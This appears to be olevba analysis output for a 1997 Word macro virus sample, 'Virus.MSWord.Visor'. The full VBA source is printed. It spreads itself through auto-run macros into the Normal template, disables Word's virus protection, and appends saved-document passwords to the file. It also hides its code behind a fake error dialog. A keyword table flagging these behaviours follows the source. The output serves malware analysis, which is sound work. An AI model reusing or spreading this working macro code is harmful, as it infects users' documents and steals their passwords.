olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Visor
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Visor - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Supervisor1.bas 
in file: Virus.MSWord.Visor - OLE stream: 'Macros/VBA/Supervisor1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoNew()
MacroCopy
End Sub
Sub AutoClose()
MacroCopy
PWL
End Sub

Sub AutoOpen()
MacroCopy
End Sub

Function MacroCopy()
Dim DocumentInstalled, GlobalInstalled As Boolean
Dim i, x As Integer

On Error GoTo hups
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
DocumentInstalled = False
GlobalInstalled = False

For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "Supervisor1" Then
       DocumentInstalled = True
    End If
Next

For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(x).Name = "Supervisor1" Then
       GlobalInstalled = True
    End If
Next

If DocumentInstalled = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, _
   Destination:=ActiveDocument.FullName, Name:="Supervisor1", _
   Object:=wdOrganizerObjectProjectItems
End If

If GlobalInstalled = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, _
   Destination:=NormalTemplate.FullName, Name:="Supervisor1", _
   Object:=wdOrganizerObjectProjectItems
End If

hups:
End Function

Function PWL()
Dim dlg

On Error GoTo hups:
Set dlg = Dialogs(wdDialogFileSaveAs)
 Open ActiveDocument.FullName For Append As #1
 Print #1, "GPPW_" & dlg.Password & "GPWPW_" & _
           dlg.WritePassword
 Close #1
 ActiveDocument.Save
hups:
End Function

Sub ToolsMacro()
MsgBox "Die angeforderte Application verursacht einen ungültigen Fehler im Modul 'Off97_bb.dll'" & Chr(13) & _
       "Bitte beheben Sie den Fehler und versuchen Sie es noch einmal.", vbCritical + vbOKOnly, "Microsoft Word"
End Sub

Sub Toolscustomize()
ToolsMacro
End Sub

Sub ViewVBcode()
ToolsMacro
End Sub

Sub PayLoad()
'Autor: Supervisor
'Herkunft: Österreich
'Datum: 1997-10-30

'An ALLE Viren-Freaks:
'Der Virus ist ein Passwort-Dieb der 1.Generation
'freut auch auf die 2.Generation!
'Spruch des Tages: "Wissen ist Macht"

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Off97_bb.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

